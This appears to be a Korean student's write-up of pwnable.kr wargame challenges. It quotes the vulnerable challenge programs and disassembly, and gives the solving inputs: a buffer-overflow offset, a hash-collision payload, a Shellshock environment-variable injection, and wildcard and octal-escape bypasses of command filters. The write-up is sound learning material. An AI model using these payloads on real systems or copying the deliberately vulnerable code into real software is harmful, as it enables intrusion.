# pwnable.kr
## fd
~~~c
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
        if(argc<2){
                printf("pass argv[1] a number\n");
                return 0;
        }
        int fd = atoi( argv[1] ) - 0x1234;
        int len = 0;
        len = read(fd, buf, 32);
        if(!strcmp("LETMEWIN\n", buf)){
                printf("good job :)\n");
                system("/bin/cat flag");
                exit(0);
        }
        printf("learn about Linux file IO\n");
        return 0;

}
~~~
여기서 argv[1]이 2보다 작으면 되는 것이므로 argv -0x1234=0이 되도록 4660을 넣어준다. ./fd 4660으로 실행하고 나서 LETMEWIN을 넘기면 flag를 확인가능하다.
## collision
~~~c
#include <stdio.h>
#include <string.h>
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
        int* ip = (int*)p;
        int i;
        int res=0;
        for(i=0; i<5; i++){
                res += ip[i];
        }
        return res;
}

int main(int argc, char* argv[]){
        if(argc<2){
                printf("usage : %s [passcode]\n", argv[0]);
                return 0;
        }
        if(strlen(argv[1]) != 20){
                printf("passcode length should be 20 bytes\n");
                return 0;
        }

        if(hashcode == check_password( argv[1] )){
                system("/bin/cat flag");
                return 0;
        }
        else
                printf("wrong passcode.\n");
        return 0;
}
~~~
이 문제는 0x21DD09EC와 입력한 다섯 char 값의 합과 동일할 경우 flag를 얻을 수 있는 것을 확인했다. 그래서 처음에는 0x21DD09EC 즉 568134124를 5로
나눠서 113,626,824 4개와 113626828 1개를 집어넣었으나 계속 20개 에러에 걸렸다. ./col `python -c 'print "\x01\x01\x01\x01"*4+"\xE8\x05\xD9\x1D"'` 즉 
01010101값 4개와 그 값을 뺀 1dd905e8을 승질나서 집어넣었더니 flag를 주었다.
## bof
~~~c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  func(-559038737);
  return 0;
}
~~~
아이다를 통해 확인해보면 main은 이와 같은 구성을 가지고 있다. 
~~~c
unsigned int __cdecl func(int a1)
{
  char s; // [esp+1Ch] [ebp-2Ch]
  unsigned int v3; // [esp+3Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  puts("overflow me : ");
  gets(&s);
  if ( a1 == 0xCAFEBABE )
    system("/bin/sh");
  else
    puts("Nah..");
  return __readgsdword(0x14u) ^ v3;
}
~~~
func은 위와 같은 구성을 가지고 있다. 따라서 func을 리눅스를 disas 했더니
~~~
gdb-peda$ disas func
Dump of assembler code for function func:
   0x0000062c <+0>:	push   ebp
   0x0000062d <+1>:	mov    ebp,esp
   0x0000062f <+3>:	sub    esp,0x48
   0x00000632 <+6>:	mov    eax,gs:0x14
   0x00000638 <+12>:	mov    DWORD PTR [ebp-0xc],eax
   0x0000063b <+15>:	xor    eax,eax
   0x0000063d <+17>:	mov    DWORD PTR [esp],0x78c
   0x00000644 <+24>:	call   0x645 <func+25>
   0x00000649 <+29>:	lea    eax,[ebp-0x2c]
   0x0000064c <+32>:	mov    DWORD PTR [esp],eax
   0x0000064f <+35>:	call   0x650 <func+36>
   0x00000654 <+40>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x0000065b <+47>:	jne    0x66b <func+63>
   0x0000065d <+49>:	mov    DWORD PTR [esp],0x79b
   0x00000664 <+56>:	call   0x665 <func+57>
   0x00000669 <+61>:	jmp    0x677 <func+75>
   0x0000066b <+63>:	mov    DWORD PTR [esp],0x7a3
   0x00000672 <+70>:	call   0x673 <func+71>
   0x00000677 <+75>:	mov    eax,DWORD PTR [ebp-0xc]
   0x0000067a <+78>:	xor    eax,DWORD PTR gs:0x14
   0x00000681 <+85>:	je     0x688 <func+92>
   0x00000683 <+87>:	call   0x684 <func+88>
   0x00000688 <+92>:	leave  
   0x00000689 <+93>:	ret    
End of assembler dump.
gdb-peda$ 
~~~
를 확인가능하다. func+29 에서 ebp-0x2c에 값이 들어가는 것을 확인가능하고 ebp 0x8에서 0xcafebabe와 값을 비교하는 것을 알게 되었다.따라서 44+8 즉 52의
dump값을 넣고 \xbe\xba\xfe\xca값을 전달하면 flag를 획득가능한 간단한 bof 문제이다.
## flag
이 문제의 경우 ida를 통해 열어봐도 main도 없고 start 함수와 sub 함수들만 있었다. gdb를 사용해봐도 함수들을 분석하지 못했다. 선배에게 힌트를 얻었더니
upx에 대해 알아보라고 알려주셨다. upx packing이 되어있음을 알 수 있었고 upx 다운로드에만 시간을 좀 사용했더니 unpacking된 flag를 얻을 수 있었다.
~~~c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char *dest; // ST08_8

  puts("I will malloc() and strcpy the flag there. take it.", argv, envp);
  dest = (char *)malloc(100LL);
  strcpy(dest, flag);
  return 0;
}
~~~
메인 함수이고 ida를 통해 flag 변수를 따라가보니 flag 값을 쉽게 확인가능했다. 
## rand
~~~c
#include <stdio.h>

int main(){
        unsigned int random;
        random = rand();        // random value!

        unsigned int key=0;
        scanf("%d", &key);

        if( (key ^ random) == 0xdeadbeef ){
                printf("Good!\n");
                system("/bin/cat flag");
                return 0;
        }

        printf("Wrong, maybe you should try 2^32 cases.\n");
        return 0;
}
~~~
이런 것을 확인가능하다. 이때 rand()를 저런 식으로 사용하면 어차피 계속 같은 값이 나온다.
~~~
(gdb) disas main
Dump of assembler code for function main:
   0x00000000004005f4 <+0>:     push   %rbp
   0x00000000004005f5 <+1>:     mov    %rsp,%rbp
   0x00000000004005f8 <+4>:     sub    $0x10,%rsp
   0x00000000004005fc <+8>:     mov    $0x0,%eax
   0x0000000000400601 <+13>:    callq  0x400500 <rand@plt>
   0x0000000000400606 <+18>:    mov    %eax,-0x4(%rbp)
   0x0000000000400609 <+21>:    movl   $0x0,-0x8(%rbp)
   0x0000000000400610 <+28>:    mov    $0x400760,%eax
   0x0000000000400615 <+33>:    lea    -0x8(%rbp),%rdx
   0x0000000000400619 <+37>:    mov    %rdx,%rsi
   0x000000000040061c <+40>:    mov    %rax,%rdi
   0x000000000040061f <+43>:    mov    $0x0,%eax
   0x0000000000400624 <+48>:    callq  0x4004f0 <__isoc99_scanf@plt>
   0x0000000000400629 <+53>:    mov    -0x8(%rbp),%eax
   0x000000000040062c <+56>:    xor    -0x4(%rbp),%eax
   0x000000000040062f <+59>:    cmp    $0xdeadbeef,%eax
   0x0000000000400634 <+64>:    jne    0x400656 <main+98>
   0x0000000000400636 <+66>:    mov    $0x400763,%edi
   0x000000000040063b <+71>:    callq  0x4004c0 <puts@plt>
   0x0000000000400640 <+76>:    mov    $0x400769,%edi
   0x0000000000400645 <+81>:    mov    $0x0,%eax
   0x000000000040064a <+86>:    callq  0x4004d0 <system@plt>
---Type <return> to continue, or q <return> to quit---
   0x000000000040064f <+91>:    mov    $0x0,%eax
   0x0000000000400654 <+96>:    jmp    0x400665 <main+113>
   0x0000000000400656 <+98>:    mov    $0x400778,%edi
   0x000000000040065b <+103>:   callq  0x4004c0 <puts@plt>
   0x0000000000400660 <+108>:   mov    $0x0,%eax
   0x0000000000400665 <+113>:   leaveq
   0x0000000000400666 <+114>:   retq
End of assembler dump.
~~~
이런 식으로 구성되어 있는 알 수 있고 0xdeadbeef와 비교하는 random 값을 보기 위해 main+59에 브레이크 포인트를 걸고 0 값 집어넣고 r 해준다.
~~~
Breakpoint 1, 0x000000000040062f in main ()
(gdb) info register $eax
eax            0x6b8b4567       1804289383
~~~
그 결과 rand 값은 0x6b8b4567이다. rand 값과 0xdeadbeef를 xor하면 00b526fb88이다. 이를 dec화하면 3039230856이다. 이를 집어넣고 프로그램을 실행하면
flag를 획득가능하다.
## input
~~~c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main(int argc, char* argv[], char* envp[]){
        printf("Welcome to pwnable.kr\n");
        printf("Let's see if you know how to give input to program\n");
        printf("Just give me correct inputs then you will get the flag :)\n");

        // argv
        if(argc != 100) return 0;
        if(strcmp(argv['A'],"\x00")) return 0;
        if(strcmp(argv['B'],"\x20\x0a\x0d")) return 0;
        printf("Stage 1 clear!\n");

        // stdio
        char buf[4];
        read(0, buf, 4);
        if(memcmp(buf, "\x00\x0a\x00\xff", 4)) return 0;
        read(2, buf, 4);
        if(memcmp(buf, "\x00\x0a\x02\xff", 4)) return 0;
        printf("Stage 2 clear!\n");

        // env
        if(strcmp("\xca\xfe\xba\xbe", getenv("\xde\xad\xbe\xef"))) return 0;
        printf("Stage 3 clear!\n");

        // file
        FILE* fp = fopen("\x0a", "r");
        if(!fp) return 0;
        if( fread(buf, 4, 1, fp)!=1 ) return 0;
        if( memcmp(buf, "\x00\x00\x00\x00", 4) ) return 0;
        fclose(fp);
        printf("Stage 4 clear!\n");

        // network
        int sd, cd;
        struct sockaddr_in saddr, caddr;
        sd = socket(AF_INET, SOCK_STREAM, 0);
        if(sd == -1){
                printf("socket error, tell admin\n");
                return 0;
        }
        saddr.sin_family = AF_INET;
        saddr.sin_addr.s_addr = INADDR_ANY;
        saddr.sin_port = htons( atoi(argv['C']) );
        if(bind(sd, (struct sockaddr*)&saddr, sizeof(saddr)) < 0){
                printf("bind error, use another port\n");
                return 1;
        }
        listen(sd, 1);
        int c = sizeof(struct sockaddr_in);
        cd = accept(sd, (struct sockaddr *)&caddr, (socklen_t*)&c);
        if(cd < 0){
                printf("accept error, tell admin\n");
                return 0;
        }
        if( recv(cd, buf, 4, 0) != 4 ) return 0;
        if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0;
        printf("Stage 5 clear!\n");

        // here's your flag
        system("/bin/cat flag");
        return 0;
}
~~~
위와 같은 code를 확인가능하다. 첫번째 stage를 해결하기 위해서는 즉 100개의 값을 집어넣어야 하고 동시에 65번째 66번째가 지정된 값이어야 한다. 두 번째 첫 번째 값\x00\x0a\x00\xff과 두번째 값\x00\x0a\x02\xff을 따로 전달해야 했다. 3번째 stage에서는 getenv로 deadbeef 환경변수를 받아서 여기 \xcafebabe값을 전달해야 했고 4번째 stage는 앞의 4 byte가 \x00\x00\x00\x00이 되도록 했다. 5번째 stage는 atoi로 argv['C']의 CHAR 값을 정수 값으로 변환하여 포트 값으로 사용해서 \xde\xad\xbe\xef를 보내주면 되었다.

## leg
~~~c
#include <stdio.h>
#include <fcntl.h>
int key1(){
	asm("mov r3, pc\n");
}
int key2(){
	asm(
	"push	{r6}\n"
	"add	r6, pc, $1\n"
	"bx	r6\n"
	".code   16\n"
	"mov	r3, pc\n"
	"add	r3, $0x4\n"
	"push	{r3}\n"
	"pop	{pc}\n"
	".code	32\n"
	"pop	{r6}\n"
	);
}
int key3(){
	asm("mov r3, lr\n");
}
int main(){
	int key=0;
	printf("Daddy has very strong arm! : ");
	scanf("%d", &key);
	if( (key1()+key2()+key3()) == key ){
		printf("Congratz!\n");
		int fd = open("flag", O_RDONLY);
		char buf[100];
		int r = read(fd, buf, 100);
		write(0, buf, r);
	}
	else{
		printf("I have strong leg :P\n");
	}
	return 0;
}
~~~
c 코드를 보면 key 1,2,3를 거쳐 key를 완성하면 flag를 볼 수 있는 것을 알 수 있다.
~~~
(gdb) disass main
Dump of assembler code for function main:
   0x00008d3c <+0>:	push	{r4, r11, lr}
   0x00008d40 <+4>:	add	r11, sp, #8
   0x00008d44 <+8>:	sub	sp, sp, #12
   0x00008d48 <+12>:	mov	r3, #0
   0x00008d4c <+16>:	str	r3, [r11, #-16]
   0x00008d50 <+20>:	ldr	r0, [pc, #104]	; 0x8dc0 <main+132>
   0x00008d54 <+24>:	bl	0xfb6c <printf>
   0x00008d58 <+28>:	sub	r3, r11, #16
   0x00008d5c <+32>:	ldr	r0, [pc, #96]	; 0x8dc4 <main+136>
   0x00008d60 <+36>:	mov	r1, r3
   0x00008d64 <+40>:	bl	0xfbd8 <__isoc99_scanf>
   0x00008d68 <+44>:	bl	0x8cd4 <key1>
   0x00008d6c <+48>:	mov	r4, r0
   0x00008d70 <+52>:	bl	0x8cf0 <key2>
   0x00008d74 <+56>:	mov	r3, r0
   0x00008d78 <+60>:	add	r4, r4, r3
   0x00008d7c <+64>:	bl	0x8d20 <key3>
   0x00008d80 <+68>:	mov	r3, r0
   0x00008d84 <+72>:	add	r2, r4, r3
   0x00008d88 <+76>:	ldr	r3, [r11, #-16]
   0x00008d8c <+80>:	cmp	r2, r3
   0x00008d90 <+84>:	bne	0x8da8 <main+108>
   0x00008d94 <+88>:	ldr	r0, [pc, #44]	; 0x8dc8 <main+140>
   0x00008d98 <+92>:	bl	0x1050c <puts>
   0x00008d9c <+96>:	ldr	r0, [pc, #40]	; 0x8dcc <main+144>
   0x00008da0 <+100>:	bl	0xf89c <system>
   0x00008da4 <+104>:	b	0x8db0 <main+116>
   0x00008da8 <+108>:	ldr	r0, [pc, #32]	; 0x8dd0 <main+148>
   0x00008dac <+112>:	bl	0x1050c <puts>
   0x00008db0 <+116>:	mov	r3, #0
   0x00008db4 <+120>:	mov	r0, r3
   0x00008db8 <+124>:	sub	sp, r11, #8
   0x00008dbc <+128>:	pop	{r4, r11, pc}
   0x00008dc0 <+132>:	andeq	r10, r6, r12, lsl #9
   0x00008dc4 <+136>:	andeq	r10, r6, r12, lsr #9
   0x00008dc8 <+140>:			; <UNDEFINED> instruction: 0x0006a4b0
   0x00008dcc <+144>:			; <UNDEFINED> instruction: 0x0006a4bc
   0x00008dd0 <+148>:	andeq	r10, r6, r4, asr #9
End of assembler dump.
(gdb) disass key1
Dump of assembler code for function key1:
   0x00008cd4 <+0>:	push	{r11}		; (str r11, [sp, #-4]!)
   0x00008cd8 <+4>:	add	r11, sp, #0
   0x00008cdc <+8>:	mov	r3, pc
   0x00008ce0 <+12>:	mov	r0, r3
   0x00008ce4 <+16>:	sub	sp, r11, #0
   0x00008ce8 <+20>:	pop	{r11}		; (ldr r11, [sp], #4)
   0x00008cec <+24>:	bx	lr
End of assembler dump.
(gdb) disass key2
Dump of assembler code for function key2:
   0x00008cf0 <+0>:	push	{r11}		; (str r11, [sp, #-4]!)
   0x00008cf4 <+4>:	add	r11, sp, #0
   0x00008cf8 <+8>:	push	{r6}		; (str r6, [sp, #-4]!)
   0x00008cfc <+12>:	add	r6, pc, #1
   0x00008d00 <+16>:	bx	r6              ;thumb로 전환
   0x00008d04 <+20>:	mov	r3, pc          ;thumb 다음이라 pc+=4가 된다
   0x00008d06 <+22>:	adds	r3, #4          ;여기서도 adds #4를 통해 +4가 된다
   0x00008d08 <+24>:	push	{r3}
   0x00008d0a <+26>:	pop	{pc}
   0x00008d0c <+28>:	pop	{r6}		; (ldr r6, [sp], #4)
   0x00008d10 <+32>:	mov	r0, r3
   0x00008d14 <+36>:	sub	sp, r11, #0
   0x00008d18 <+40>:	pop	{r11}		; (ldr r11, [sp], #4)
   0x00008d1c <+44>:	bx	lr
End of assembler dump.
(gdb) disass key3
Dump of assembler code for function key3:
   0x00008d20 <+0>:	push	{r11}		; (str r11, [sp, #-4]!)
   0x00008d24 <+4>:	add	r11, sp, #0
   0x00008d28 <+8>:	mov	r3, lr
   0x00008d2c <+12>:	mov	r0, r3          ;위의 줄을 동시에 보면 r0에 lr 값이 들어갔다
   0x00008d30 <+16>:	sub	sp, r11, #0
   0x00008d34 <+20>:	pop	{r11}		; (ldr r11, [sp], #4)
   0x00008d38 <+24>:	bx	lr
End of assembler dump.
(gdb) 
~~~
disas의 결과는 위와 같은데 gdb를 실행하지 못하는 환경이기에 이렇게 disas 값을 다 제공한 거 같다. 여기서 pc 값을 알아봤더니 arm에서 fetch를 가리키는 알 수 있었다. disas key를 보면 r3을 통해 pc에서 r0로 값을 넘긴다. 따라서 key1 값은 8cdc+2인 0x8ce4였다. key2는 주석들을 보면 0x8d04+8해서 0x8d0c인 것을 알 수 있다. rl은 return 값을 가진다는 것을 알 수 있었고 메인에 아니나다를까 key3가 떡하니 나와있었다. 이 값들을 
더하여  108400을 입력해 flag를 얻었다.
## mistake
~~~c
#include <stdio.h>
#include <fcntl.h>

#define PW_LEN 10
#define XORKEY 1

void xor(char* s, int len){
        int i;
        for(i=0; i<len; i++){
                s[i] ^= XORKEY;
        }
}

int main(int argc, char* argv[]){

        int fd;
        if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
                printf("can't open password %d\n", fd);
                return 0;
        }

        printf("do not bruteforce...\n");
        sleep(time(0)%20);

        char pw_buf[PW_LEN+1];
        int len;
        if(!(len=read(fd,pw_buf,PW_LEN) > 0)){
                printf("read error\n");
                close(fd);
                return 0;
        }

        char pw_buf2[PW_LEN+1];
        printf("input password : ");
        scanf("%10s", pw_buf2);

        // xor your input
        xor(pw_buf2, 10);

        if(!strncmp(pw_buf, pw_buf2, PW_LEN)){
                printf("Password OK\n");
                system("/bin/cat flag\n");
        }
        else{
                printf("Wrong Password\n");
        }

        close(fd);
        return 0;
}
~~~
간단히 풀리는 문제이다. 10개의 값을 넣고 다시 넣은 10개의 값은 xor에서 1이 나오도록 하면 된다.
~~~
mistake@prowl:~$ ./mistake
do not bruteforce...
0000000000
input password : 1111111111
Password OK
~~~
이렇게 flag를 획득했다.
## shellshock
~~~c
#include <stdio.h>
int main(){
     setresuid(getegid(), getegid(), getegid());
     setresgid(getegid(), getegid(), getegid());
     system("/home/shellshock/bash -c 'echo shock_me'");
     return 0;
}
~~~
코드는 위와 같다. 이 문제의 특이한 점은 bash가 들어있는 것이다.
~~~
./shellshock 
shock_me
~~~
shell shock을 실행시키면 bash를 가져오는 것을 알 수 있었고 bash에 대해 구글링했다.
~~~
shellshock@prowl:~$ export hello='() { cat flag; }'
shellshock@prowl:~$ ./bash
shellshock@prowl:~$ hello
~~~
혹시나 해서 바로 export로 환경변수를 이와 설정했더니 바로 flag는 보여주지 않는 모양이다.
그래서 shellshock이라는 이름으로 좀 더 검색해보고 env x='() {:; }; /bin/cat flag' /home/shellshock/shellshock 와 같은 방식으로
falg를 획득가능했다. shellshock에 대한 이해는 따로 정리해서 올리겠다.
## lotto
~~~c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>

unsigned char submit[6];

void play(){

        int i;
        printf("Submit your 6 lotto bytes : ");
        fflush(stdout);

        int r;
        r = read(0, submit, 6);

        printf("Lotto Start!\n");
        //sleep(1);

        // generate lotto numbers
        int fd = open("/dev/urandom", O_RDONLY);
        if(fd==-1){
                printf("error. tell admin\n");
                exit(-1);
        }
        unsigned char lotto[6];
        if(read(fd, lotto, 6) != 6){
                printf("error2. tell admin\n");
                exit(-1);
        }
        for(i=0; i<6; i++){
                lotto[i] = (lotto[i] % 45) + 1;         // 1 ~ 45
        }
        close(fd);

        // calculate lotto score
        int match = 0, j = 0;
        for(i=0; i<6; i++){
                for(j=0; j<6; j++){
                        if(lotto[i] == submit[j]){
                                match++;
                        }
                }
        }

        // win!
        if(match == 6){
                system("/bin/cat flag");
        }
        else{
                printf("bad luck...\n");
        }

}

void help(){
        printf("- nLotto Rule -\n");
        printf("nlotto is consisted with 6 random natural numbers less than 46\n");
        printf("your goal is to match lotto numbers as many as you can\n");
        printf("if you win lottery for *1st place*, you will get reward\n");
        printf("for more details, follow the link below\n");
        printf("http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n");
        printf("mathematical chance to win this game is known to be 1/8145060.\n");
}

int main(int argc, char* argv[]){

        // menu
        unsigned int menu;

        while(1){

                printf("- Select Menu -\n");
                printf("1. Play Lotto\n");
                printf("2. Help\n");
                printf("3. Exit\n");

                scanf("%d", &menu);

                switch(menu){
                        case 1:
                                play();
                                break;
                        case 2:
                                help();
                                break;
                        case 3:
                                printf("bye\n");
                                return 0;
                        default:
                                printf("invalid menu\n");
                                break;
                }
        }
        return 0;
}
~~~
장난으로 * 6개 넣었다가 풀렸다. 경악  
알고보니 코드상 !나 +와 같은 특수 문자를 넣으면 일정한 확률로 FLAG를 주는 것이었다.
## blackjack
blackjack을 여니 엄청나게 긴 코드를 확인 가능했다. 
~~~c
int betting() //Asks user amount to bet
{
 printf("\n\nEnter Bet: $");
 scanf("%d", &bet);
 
 if (bet > cash) //If player tries to bet more money than player has
 {
        printf("\nYou cannot bet more money than you have.");
        printf("\nEnter Bet: ");
        scanf("%d", &bet);
        return bet;
 }
 else return bet;
} // End Function
~~~
betting 함수를 보면 bet>cash보다 크더라도 bet<cash일때까지 반복하는 것이 아닌 한번 더 물어보고 그 값이 저장된다. 따라서 bet 값에 두번 연속으로 큰
값을 집어넣어 봤더니 flag를 줬다. 괴상하다.
## cmd1
~~~c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "flag")!=0;
        r += strstr(cmd, "sh")!=0;
        r += strstr(cmd, "tmp")!=0;
        return r;
}
int main(int argc, char* argv[], char** envp){
        putenv("PATH=/thankyouverymuch");
        if(filter(argv[1])) return 0;
        system( argv[1] );
        return 0;
}
~~~
따라서 입력하는 명령어가 실행되는 구조이다. 아래와 같이 실행가능하다(금지된 flag,sh,tmp 제외)
~~~
cmd1@prowl:~$ ./cmd1 "echo hello"
hello
~~~
버퍼 플로우를 시도할려고 파일의 앞에 "\0"값을 넣었으나 통하지 않았다. 그래서 strstr의 취약한 부분에 대해 검색하니 fl*와 같이
와일드 카드를 사용가능하다는 것이다. 직접 주소를 입력하려고 했으나 계속 실수를 해서 ./cmd1 "bin/cat fl*" 절대 경로를 사용해서
풀었다.
## blukat
~~~c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
char flag[100];
char password[100];
char* key = "3\rG[S/%\x1c\x1d#0?\rIS\x0f\x1c\x1d\x18;,4\x1b\x00\x1bp;5\x0b\x1b\x08\x45+";
void calc_flag(char* s){
        int i;
        for(i=0; i<strlen(s); i++){
                flag[i] = s[i] ^ key[i];
        }
        printf("%s\n", flag);
}
int main(){
        FILE* fp = fopen("/home/blukat/password", "r");
        fgets(password, 100, fp);
        char buf[100];
        printf("guess the password!\n");
        fgets(buf, 128, stdin);
        if(!strcmp(password, buf)){
                printf("congrats! here is your flag: ");
                calc_flag(password);
        }
        else{
                printf("wrong guess!\n");
                exit(0);
        }
        return 0;
}
~~~
코드는 위와 같았다. 어차피 printf로 flag를 뱉어나고 난 후 calc_flag가 진행되니 calc_flag를 딱히 신경쓰지 않았다. 
password를 알아야 하니 gdb로 disas main을 돌렸다.
~~~
 0x0000000000400863 <+105>:   mov    $0x6010a0,%edi
   0x0000000000400868 <+110>:   callq  0x400650 <strcmp@plt>
~~~
여기서 0x6010a0가 비교되는 값이라는 것을 알 수 있었다. breakpoint를 110쯤 잡아서 x/s60110a0를 해줬더니 password 값을 보내줬다. 간단

## cmd2
~~~c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "=")!=0;
        r += strstr(cmd, "PATH")!=0;
        r += strstr(cmd, "export")!=0;
        r += strstr(cmd, "/")!=0;
        r += strstr(cmd, "`")!=0;
        r += strstr(cmd, "flag")!=0;
        return r;
}

extern char** environ;
void delete_env(){
        char** p;
        for(p=environ; *p; p++) memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
        delete_env();
        putenv("PATH=/no_command_execution_until_you_become_a_hacker");
        if(filter(argv[1])) return 0;
        printf("%s\n", argv[1]);
        system( argv[1] );
        return 0;
}
~~~ 
cmd1을 풀었던 것을 참고하면 /만 사용가능하면 같은 방식으로 풀 수 있을 거 같았다. /를 쓰는 방법을 검색하다 ascii로 encode해서 "\57"로
대신하는 것이다. 명령어 내에 다시 $ (echo "\57")를 /로 사용해준다. 결국 다 적으면 ./cmd '$(echo "\57")bin$(echo "\57")cat flag'와 같은 
형태를 가지게 된다.
## uaf
UAF는 use after free의 약자로 메모리 영역을 free 한 후에 재사용하게 될 경우 발생하는 취약점을 의미한다.
## asm
이 문제를 풀면서 느꼈는데 payload 짜는게 세상 싫다.
~~~c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <seccomp.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <unistd.h>

#define LENGTH 128

void sandbox(){
        scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
        if (ctx == NULL) {
                printf("seccomp error\n");
                exit(0);
        }

        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);

        if (seccomp_load(ctx) < 0){
                seccomp_release(ctx);
                printf("seccomp error\n");
                exit(0);
        }
        seccomp_release(ctx);
}

char stub[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";
unsigned char filter[256];
int main(int argc, char* argv[]){

        setvbuf(stdout, 0, _IONBF, 0);
        setvbuf(stdin, 0, _IOLBF, 0);

        printf("Welcome to shellcoding practice challenge.\n");
        printf("In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n");
        printf("Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n");
        printf("If this does not challenge you. you should play 'asg' challenge :)\n");

        char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);
        memset(sh, 0x90, 0x1000);
        memcpy(sh, stub, strlen(stub));

        int offset = sizeof(stub);
        printf("give me your x64 shellcode: ");
        read(0, sh+offset, 1000);

        alarm(10);
        chroot("/home/asm_pwn");        // you are in chroot jail. so you can't use symlink in /tmp
        sandbox();
        ((void (*)(void))sh)();
        return 0;
}

~~~
nc 0 9026을 해보고 shellcode를 통해 flag를 얻는 문제라는 것을 알았다. ls해서 엄청 긴 파일이 있길래
열었더니 그저 실제 flag 파일의 이름을 알게하기 위한거라고 한다. payload의 경우는 argc에 금방 긴 파일의
이름을 집어넣고 open read write 차례로 하면 되는 것을 알 수 있었으나 결국 py 코드를 참고했다.
## 
